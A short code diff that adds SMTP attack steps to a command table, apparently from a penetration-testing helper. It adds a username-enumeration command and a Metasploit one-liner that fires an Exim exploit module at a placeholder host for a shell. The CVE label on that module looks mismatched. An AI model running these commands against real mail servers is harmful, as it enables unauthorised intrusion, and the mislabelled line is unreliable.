@@ -4945,6 +4945,7 @@ _STEP_COMMANDS = {
         2: [
             "smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/Names/names.txt -D <DOMAIN> -t <RHOST>",
             "smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t <RHOST>",
+            "smtp-user-enum -M EXPN -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t <RHOST>",
         ],
         3: [
             "nmap -p25 --script smtp-open-relay <RHOST>",
@@ -4955,6 +4956,7 @@ _STEP_COMMANDS = {
         ],
         5: [
             "# Exim CVE-2019-10149 / template injection → shell as the mail service",
+            "msfconsole -q -x 'use exploit/linux/smtp/exim4_string_format; set RHOSTS <RHOST>; run'   # Exim CVE-2019-10149",
             "msfconsole -q -x 'search <PRODUCT>'",
         ],
         6: [
